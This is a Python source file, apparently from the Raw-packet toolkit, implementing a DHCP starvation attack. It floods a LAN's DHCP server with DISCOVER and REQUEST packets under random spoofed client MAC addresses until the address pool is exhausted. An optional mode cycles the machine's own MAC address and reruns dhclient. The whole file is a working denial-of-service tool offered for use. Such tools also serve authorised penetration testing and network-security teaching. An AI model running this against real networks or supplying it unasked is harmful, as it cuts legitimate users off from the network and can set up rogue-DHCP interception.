#!/usr/bin/env python
# -*- coding: utf-8 -*-

# region Description
"""
dhcp_starvation.py: DHCP Starvation attack script
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import

# region Add project root path
from sys import path
from os.path import dirname, abspath
path.append(dirname(dirname(dirname(abspath(__file__)))))
# endregion

# region Raw-packet modules
from raw_packet.Utils.network import Ethernet_raw, DHCP_raw, Sniff_raw
from raw_packet.Utils.tm import ThreadManager
from raw_packet.Utils.base import Base
# endregion

# region Import libraries
from socket import socket, SOCK_RAW, AF_PACKET
from sys import exit
from os import system
from argparse import ArgumentParser
from datetime import datetime
from time import sleep, time
from random import randint
from json import dumps
# endregion

# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.0.4'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
# endregion

# region Check user, platform and print banner
Base = Base()
Base.check_user()
Base.check_platform()
Base.print_banner()
# endregion

# region Parse script arguments
parser = ArgumentParser(description='DHCP Starvation attack script')

parser.add_argument('-i', '--interface', type=str, help='Set interface name for send discover packets')
parser.add_argument('-d', '--delay', type=int, help='Set delay time in seconds (default: 1)', default=1)
parser.add_argument('-t', '--timeout', type=int, help='Set receiving timeout in seconds (default: 10)', default=10)
parser.add_argument('-n', '--not_send_hostname', action='store_true', help='Do not send hostname in DHCP request')
parser.add_argument('-v', '--dhcp_option_value', type=str, help='Set DHCP option value', default=None)
parser.add_argument('-c', '--dhcp_option_code', type=int, help='Set DHCP option code (default: 12)', default=12)
parser.add_argument('-f', '--find_dhcp', action='store_true', help='Only find DHCP server in your network')
parser.add_argument('-m', '--mac_change', action='store_true', help='Use mac change technique')

args = parser.parse_args()
# endregion

# region Set global variables
transactions = {}
ack_received = False
dhcp_server_ip = None
dhcp_server_mac = None
global_socket = None
# endregion

# region set DHCP option code and value
dhcp_option_value = None
dhcp_option_code = 12

if args.dhcp_option_value is not None:
    dhcp_option_value = args.dhcp_option_value

if args.dhcp_option_code != 12:
    dhcp_option_code = args.dhcp_option_code
# endregion

# region Get listen network interface, your IP address and MAC address
if args.interface is None:
    Base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
listen_network_interface = Base.netiface_selection(args.interface)

your_ip_address = Base.get_netiface_ip_address(listen_network_interface)
if your_ip_address is None:
    Base.print_error("Network interface: ", listen_network_interface, " does not have IP address!")
    exit(1)

your_mac_address = Base.get_netiface_mac_address(listen_network_interface)
if your_mac_address is None:
    Base.print_error("Network interface: ", listen_network_interface, " does not have mac address!")
    exit(1)
# endregion

# region Create raw socket
global_socket = socket(AF_PACKET, SOCK_RAW)
global_socket.bind((listen_network_interface, 0))
# endregion

# region General output
Base.print_info("Listen network interface: ", listen_network_interface)
Base.print_info("Your IP address: ", your_ip_address)
Base.print_info("Your MAC address: ", your_mac_address)
# endregion

# region Get start time
start_time = time()
# endregion


# region Send DHCP discover
def send_dhcp_discover():
    sleep(1)

    eth = Ethernet_raw()
    dhcp = DHCP_raw()

    Base.print_info("Sending discover packets...")
    Base.print_info("Delay between DISCOVER packets: ", str(args.delay), " sec.")
    Base.print_info("Start sending packets: ", str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")))

    discover_raw_socket = socket(AF_PACKET, SOCK_RAW)
    discover_raw_socket.bind((listen_network_interface, 0))

    try:
        while True:

            client_mac = eth.get_random_mac()
            transaction_id = randint(1, 4294967295)

            discover_packet = dhcp.make_request_packet(source_mac=your_mac_address,
                                                       client_mac=client_mac,
                                                       transaction_id=transaction_id,
                                                       dhcp_message_type=1,
                                                       host_name=None,
                                                       requested_ip=None,
                                                       option_value=dhcp_option_value,
                                                       option_code=dhcp_option_code,
                                                       relay_agent_ip=your_ip_address)
            discover_raw_socket.send(discover_packet)
            transactions[transaction_id] = client_mac

            if int(time() - start_time) > args.timeout:
                if ack_received:
                    Base.print_success("IP address pool is exhausted: ", str(datetime.now().strftime("%Y/%m/%d %H:%M:%S")))
                else:
                    Base.print_error("DHCP Starvation failed timeout!")
                sleep(1)
                exit(1)

            sleep(int(args.delay))

    except KeyboardInterrupt:
        Base.print_info("Exit")
        discover_raw_socket.close()
        exit(0)

# endregion


# region Send DHCP request
def send_dhcp_request(request):

    # region Global variables
    global start_time
    global ack_received
    global transactions
    global dhcp_server_ip
    global dhcp_server_mac
    global global_socket
    # endregion

    if 'DHCP' in request.keys():

        # region Get reply transaction id, client ip
        xid = request['BOOTP']['transaction-id']
        yiaddr = request['BOOTP']['your-ip-address']
        siaddr = request['BOOTP']['server-ip-address']
        # endregion

        # region Get DHCP server IP
        if dhcp_server_ip is None:
            if siaddr == "0.0.0.0":
                dhcp_server_ip = request['IP']['source-ip']
            else:
                dhcp_server_ip = siaddr
            dhcp_server_mac = request['Ethernet']['source']
        # endregion

        # region Rewrite start time
        start_time = time()
        # endregion

        # region DHCP OFFER
        if request['DHCP'][53] == 2:
            if args.find_dhcp:
                Base.print_success("DHCP server IP: ", dhcp_server_ip)
                Base.print_success("DHCP server MAC: ", dhcp_server_mac)
                Base.print_success("DHCP packet: ")
                print(dumps(request, indent=4))
                exit(0)

            Base.print_info("OFFER from: ", dhcp_server_ip, " your client ip: ", yiaddr)

            try:
                if args.not_send_hostname:
                    host_name = None
                else:
                    host_name = Base.make_random_string(8)

                dhcp = DHCP_raw()
                request_packet = dhcp.make_request_packet(source_mac=your_mac_address,
                                                          client_mac=transactions[xid],
                                                          transaction_id=xid,
                                                          dhcp_message_type=3,
                                                          host_name=host_name,
                                                          requested_ip=yiaddr,
                                                          option_value=dhcp_option_value,
                                                          option_code=dhcp_option_code,
                                                          relay_agent_ip=your_ip_address)
                global_socket.send(request_packet)
            except KeyError:
                Base.print_error("Key error, this transaction id: ", hex(xid), " not found in our transactions!")
            except:
                Base.print_error("Unknown error!")
        # endregion

        # region DHCP ACK
        if request['DHCP'][53] == 5:
            ack_received = True
            Base.print_info("ACK from:   ", dhcp_server_ip, " your client ip: ", yiaddr)
        # endregion

        # region DHCP NAK
        if request['DHCP'][53] == 6:
            Base.print_error("NAK from:   ", dhcp_server_ip, " your client ip: ", yiaddr)
        # endregion
# endregion


# region Main function
if __name__ == "__main__":

    try:
        # region MAC change technique
        if args.mac_change:
            eth = Ethernet_raw()

            # region Get old ip and mac addresses
            old_mac_address = Base.get_netiface_mac_address(listen_network_interface)
            old_ip_address = Base.get_netiface_ip_address(listen_network_interface)
            # endregion

            # region Stop network
            Base.print_info("Stop network ...")
            system('service network-manager stop')
            system('service networking stop 2>/dev/null')
            system('service network stop 2>/dev/null')
            # endregion

            while True:
                new_mac_address = eth.get_random_mac()

                # region Change MAC
                Base.print_info("New MAC address: ", new_mac_address)
                system('ifconfig ' + listen_network_interface + ' down')
                system('ifconfig ' + listen_network_interface + ' hw ether ' + new_mac_address)
                system('ifconfig ' + listen_network_interface + ' up')
                # endregion

                # region Start network
                system('service network-manager start')
                system('service networking start 2>/dev/null')
                system('service network start 2>/dev/null')
                # endregion

                # region Check current MAC
                current_mac_address = Base.get_netiface_mac_address(listen_network_interface)
                if current_mac_address == old_mac_address:
                    Base.print_error("MAC address not changed, the network driver may not support MAC address change!")
                    exit(1)
                # endregion

                # region Rewrite start time
                start_time = time()
                # endregion

                # region Dhclient
                system('dhclient ' + listen_network_interface + ' >/dev/null 2>&1')
                # endregion

                # region Check current IP
                current_ip_address = None
                while current_ip_address is None:
                    current_ip_address = Base.get_netiface_ip_address(listen_network_interface)
                    if int(time() - start_time) > args.timeout:
                        Base.print_error("DHCP Starvation failed timeout!")
                        sleep(1)
                        exit(1)
                    sleep(1)

                if current_ip_address == old_ip_address:
                    Base.print_error("IP address not changed, maybe IP address for this interface configured manually!")
                    exit(1)
                else:
                    Base.print_info("Received a new IP address: ", current_ip_address)
                # endregion

                # region Rewrite old mac and ip addresses
                old_mac_address = current_mac_address
                old_ip_address = current_ip_address
                # endregion

                sleep(int(args.delay))
        # endregion

        else:
            # region Start DHCP sender in other thread
            tm = ThreadManager(2)
            tm.add_task(send_dhcp_discover)
            # endregion

            # region Set network filter
            network_filters = {}
            network_filters['IP'] = {'destination-ip': your_ip_address}
            network_filters['UDP'] = {'source-port': 67}
            network_filters['UDP'] = {'destination-port': 67}
            # endregion

            # region Start sniffer
            sniff = Sniff_raw()
            sniff.start(protocols=['IP', 'UDP', 'DHCP'], prn=send_dhcp_request, filters=network_filters)
            # endregion

    except KeyboardInterrupt:
        # region Start network
        system('service network-manager start')
        system('service networking start 2>/dev/null')
        system('service network start 2>/dev/null')
        # endregion

        Base.print_info("Exit ...")
        exit(3)

# endregion
